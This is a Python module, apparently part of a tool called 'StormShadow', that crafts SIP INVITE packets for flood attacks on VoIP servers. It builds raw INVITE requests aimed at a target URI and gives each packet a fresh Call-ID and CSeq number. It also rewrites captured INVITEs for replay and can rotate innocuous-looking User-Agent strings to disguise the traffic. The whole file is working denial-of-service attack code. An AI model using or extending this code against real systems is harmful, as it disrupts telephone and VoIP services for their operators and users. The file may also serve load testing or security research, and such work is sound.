"""
SIP packet handling for INVITE flood attacks.

This module provides SIP-specific packet manipulation for the INVITE flood
attack, including Call-ID management and session stickiness.
"""

import re
import uuid
from typing import Dict, Any, Optional, List
try:
    from utils.spoofing import SIPPacketHandler
except Exception:  # pragma: no cover - fallback for docs/autodoc when module is missing
    class SIPPacketHandler:  # type: ignore
        """Fallback stub for documentation builds when utils.spoofing is unavailable.

        This stub exposes the minimal API used by InviteFloodPacketHandler so that
        Sphinx autodoc can import the module without errors.
        """

        VIA_PATTERN = re.compile(rb"Via:\s*(.*?)\r?\n", re.IGNORECASE)

        def __init__(self, config: dict | None = None) -> None:  # noqa: D401
            self.config = config or {}

        def _parse_sip_uri(self, uri: str) -> dict:
            return {}

        def modify_packet_for_stickiness(self, original: bytes, new_session_id: str, mods: dict | None = None) -> bytes:
            return original


class InviteFloodPacketHandler(SIPPacketHandler):
    """
    Specialized SIP packet handler for INVITE flood attacks.
    
    Extends the base SIP handler with attack-specific functionality
    for INVITE flood scenarios.
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize INVITE flood packet handler.
        
        Args:
            config: Handler configuration
        """
        super().__init__(config)
        
        # INVITE flood specific configuration
        self.flood_call_id_pattern = config.get('flood_call_id_pattern', 'inviteflood-{session}-{sequence}')
        self.sequence_counter = 0
        self.session_prefix = config.get('session_prefix', 'storm')
        self.maintain_from_uri = config.get('maintain_from_uri', True)
        self.maintain_to_uri = config.get('maintain_to_uri', True)
        self.randomize_user_agent = config.get('randomize_user_agent', False)
        
        # User agent variations for randomization
        self.user_agents = [
            'StormShadow-SIPFlood/1.0',
            'SIP-Tester/2.0',
            'Load-Generator/1.5',
            'Traffic-Simulator/3.0'
        ]
    
    def create_flood_packet(self, target_uri: str, 
                          from_uri: str,
                          session_id: Optional[str] = None,
                          custom_headers: Optional[Dict[str, str]] = None) -> bytes:
        """
        Create a SIP INVITE packet optimized for flood attacks.
        
        Args:
            target_uri: Target SIP URI
            from_uri: From SIP URI
            session_id: Session identifier (Call-ID)
            custom_headers: Additional custom headers
            
        Returns:
            Raw SIP INVITE packet
        """
        if session_id is None:
            session_id = self.generate_flood_call_id()
        
        # Increment sequence counter
        self.sequence_counter += 1
        
        # Parse URIs to extract components
        target_info = self._parse_sip_uri(target_uri)
        from_info = self._parse_sip_uri(from_uri)
        
        # Generate tags and branches
        from_tag = self._generate_tag()
        via_branch = self._generate_via_branch()
        
        # Build the INVITE request
        invite_lines: List[str] = []
        
        # Request line
        invite_lines.append(f"INVITE {target_uri} SIP/2.0")
        
        # Via header
        via_host = from_info.get('target_host', '127.0.0.1')
        via_port = from_info.get('target_port', 5060)
        invite_lines.append(f"Via: SIP/2.0/UDP {via_host}:{via_port};branch={via_branch}")
        
        # Max-Forwards
        invite_lines.append("Max-Forwards: 70")
        
        # To header
        invite_lines.append(f"To: {target_uri}")
        
        # From header
        invite_lines.append(f"From: {from_uri};tag={from_tag}")
        
        # Call-ID
        invite_lines.append(f"Call-ID: {session_id}")
        
        # CSeq
        invite_lines.append(f"CSeq: {self.sequence_counter} INVITE")
        
        # Contact header
        contact_uri = f"sip:{from_info.get('target_user', 'storm')}@{via_host}:{via_port}"
        invite_lines.append(f"Contact: <{contact_uri}>")
        
        # User-Agent
        if self.randomize_user_agent:
            import random
            user_agent = random.choice(self.user_agents)
        else:
            user_agent = self.user_agents[0]
        invite_lines.append(f"User-Agent: {user_agent}")
        
        # Content-Type and Content-Length (no body for basic flood)
        invite_lines.append("Content-Type: application/sdp")
        invite_lines.append("Content-Length: 0")
        
        # Add custom headers if provided
        if custom_headers:
            for header_name, header_value in custom_headers.items():
                invite_lines.append(f"{header_name}: {header_value}")
        
        # Empty line to end headers
        invite_lines.append("")
        
        # Join with CRLF
        packet = "\r\n".join(invite_lines)
        return packet.encode('utf-8')
    
    def generate_flood_call_id(self, session_base: Optional[str] = None) -> str:
        """
        Generate Call-ID optimized for flood attacks.
        
        Args:
            session_base: Base session identifier
            
        Returns:
            Generated Call-ID
        """
        if session_base is None:
            session_base = f"{self.session_prefix}-{uuid.uuid4().hex[:8]}"
        
        call_id = self.flood_call_id_pattern.format(
            session=session_base,
            sequence=self.sequence_counter
        )
        
        return call_id
    
    def modify_invite_for_flood(self, original_invite: bytes,
                              new_session_id: Optional[str] = None,
                              target_modifications: Optional[Dict[str, Any]] = None) -> bytes:
        """
        Modify an existing INVITE packet for flood attack purposes.
        
        Args:
            original_invite: Original INVITE packet
            new_session_id: New Call-ID to use
            target_modifications: Specific modifications to apply
            
        Returns:
            Modified INVITE packet
        """
        target_modifications = target_modifications or {}
        
        if new_session_id is None:
            new_session_id = self.generate_flood_call_id()
        
        # Use the base SIP handler for session stickiness
        modified_packet = self.modify_packet_for_stickiness(
            original_invite, 
            new_session_id, 
            target_modifications
        )
        
        # Apply flood-specific modifications
        if 'randomize_user_agent' in target_modifications and target_modifications['randomize_user_agent']:
            modified_packet = self._randomize_user_agent(modified_packet)
        
        if 'update_sequence' in target_modifications and target_modifications['update_sequence']:
            modified_packet = self._update_cseq(modified_packet)
        
        return modified_packet
    
    def extract_flood_metrics(self, packet_data: bytes) -> Dict[str, Any]:
        """
        Extract metrics relevant to flood attack analysis.
        
        Args:
            packet_data: SIP packet data
            
        Returns:
            Metrics dictionary
        """
        metrics = {}
        
        # Get basic target info
        target_info = self.extract_target_info(packet_data)
        metrics.update(target_info)
        
        # Extract CSeq information
        cseq_match = re.search(rb'CSeq:\s*(\d+)\s+(\w+)', packet_data, re.IGNORECASE)
        if cseq_match:
            metrics['cseq_number'] = int(cseq_match.group(1))
            metrics['cseq_method'] = cseq_match.group(2).decode('utf-8', errors='ignore')
        
        # Extract User-Agent
        ua_match = re.search(rb'User-Agent:\s*([^\r\n]+)', packet_data, re.IGNORECASE)
        if ua_match:
            metrics['user_agent'] = ua_match.group(1).decode('utf-8', errors='ignore').strip()
        
        # Extract Via information
        via_match = self.VIA_PATTERN.search(packet_data)
        if via_match:
            via_header = via_match.group(1).decode('utf-8', errors='ignore')
            metrics['via_protocol'] = self._extract_via_protocol(via_header)
            metrics['via_host'] = self._extract_via_host(via_header)
        
        return metrics
    
    def _generate_tag(self) -> str:
        """Generate a random tag for SIP headers."""
        return uuid.uuid4().hex[:10]
    
    def _generate_via_branch(self) -> str:
        """Generate a Via branch parameter."""
        return f"z9hG4bK-{uuid.uuid4().hex[:16]}"
    
    def _randomize_user_agent(self, packet: bytes) -> bytes:
        """Randomize User-Agent header in packet."""
        import random
        
        ua_match = re.search(rb'User-Agent:\s*([^\r\n]+)', packet)
        if ua_match:
            old_ua = ua_match.group(0)
            new_ua = f"User-Agent: {random.choice(self.user_agents)}".encode('utf-8')
            packet = packet.replace(old_ua, new_ua, 1)
        
        return packet
    
    def _update_cseq(self, packet: bytes) -> bytes:
        """Update CSeq number in packet."""
        self.sequence_counter += 1
        
        cseq_match = re.search(rb'CSeq:\s*(\d+)\s+(\w+)', packet)
        if cseq_match:
            old_cseq = cseq_match.group(0)
            method = cseq_match.group(2).decode('utf-8', errors='ignore')
            new_cseq = f"CSeq: {self.sequence_counter} {method}".encode('utf-8')
            packet = packet.replace(old_cseq, new_cseq, 1)
        
        return packet
    
    def _extract_via_protocol(self, via_header: str) -> str:
        """Extract protocol from Via header."""
        match = re.search(r'SIP/2\.0/(\w+)', via_header, re.IGNORECASE)
        return match.group(1) if match else 'UDP'
    
    def _extract_via_host(self, via_header: str) -> str:
        """Extract host from Via header."""
        match = re.search(r'SIP/2\.0/\w+\s+([^;:\s]+)', via_header, re.IGNORECASE)
        return match.group(1) if match else '127.0.0.1'


# Factory function for creating the packet handler
def create_inviteflood_handler(config: Optional[Dict[str, Any]] = None) -> InviteFloodPacketHandler:
    """
    Factory function to create an INVITE flood packet handler.
    
    Args:
        config: Handler configuration
        
    Returns:
        InviteFloodPacketHandler instance
    """
    config = config or {}
    return InviteFloodPacketHandler(config)


# Module info for registration
MODULE_INFO = {
    'description': 'SIP INVITE flood packet handler',
    'version': '1.0.0',
    'author': 'StormShadow Team',
    'requirements': ['utils.spoofing'],
    'supported_configs': ['flood_call_id_pattern', 'session_prefix', 'randomize_user_agent']
}